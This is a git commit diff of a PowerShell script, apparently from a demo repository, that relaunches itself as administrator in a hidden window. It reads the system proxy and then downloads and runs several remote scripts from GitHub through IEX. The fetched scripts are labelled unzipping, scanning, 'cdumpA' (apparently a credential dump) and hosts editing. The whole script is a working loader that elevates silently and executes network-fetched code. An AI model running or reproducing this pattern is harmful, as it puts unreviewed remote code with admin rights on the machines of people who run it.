65ffd0ab9199210d3295bd2f7ceab86b1df93c99
tameval <114147355+tameval@users.noreply.github.com>
2022-10-23 23:43:06 +0900

    Update init_124509.ps1

--- 124509/proxy/init_124509.ps1
+++ 124509/proxy/init_124509.ps1
@@ -1,15 +1,26 @@
 if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole("Administrators")) { Start-Process powershell -WindowStyle Hidden "-File `"$PSCommandPath`"" -Verb RunAs; exit }
 
-$proxy_url = 'http://13.231.199.128:3128'; $web_client = New-Object System.Net.WebClient; $proxy_server = New-Object System.Net.WebProxy($proxy_url, $true); $web_client.Proxy = $proxy_server
+#(Get-Item -Path "Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings").GetValue("AutoConfigURL") #PACでプロキシを指定
+$proxy_url = (Get-Item -Path "Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings").GetValue("ProxyServer") #プロキシをアドレスで指定
+
+#プロキシの参照がうまくいかない場合は明示的に指定
+#$proxy_url= 'http://13.231.199.128:3128'
+
+if ($proxy_url -ne $null)
+{
+    $proxy_url = "http://" + $proxy_url
+    set-Content C:\CRDemo\proxy.txt $proxy_url
+    $web_client = New-Object System.Net.WebClient; $proxy_server = New-Object System.Net.WebProxy($proxy_url, $true); $web_client.Proxy = $proxy_server
+}
 
 #7zip
 IEX $web_client.DownloadString('https://raw.githubusercontent.com/tameval/script/main/124509/proxy/unzip_124509pr.ps1')
 
 #scanning
-IEX $web_client.DownloadString('https://raw.githubusercontent.com/tameval/script/main/124509/proxy/scan_124509.ps1')
+IEX $web_client.DownloadString('https://raw.githubusercontent.com/tameval/script/main/124509/proxy/scan_124509pr.ps1') 
 
 #cdumpA
-IEX $web_client.DownloadString('https://raw.githubusercontent.com/tameval/script/main/124509/proxy/cdumpa_124509.ps1')
+IEX $web_client.DownloadString('https://raw.githubusercontent.com/tameval/script/main/124509/proxy/cdumpa_124509pr.ps1')
 
 #hosts
 IEX $web_client.DownloadString('https://raw.githubusercontent.com/tameval/script/main/124509/proxy/hosts_124509pr.ps1')
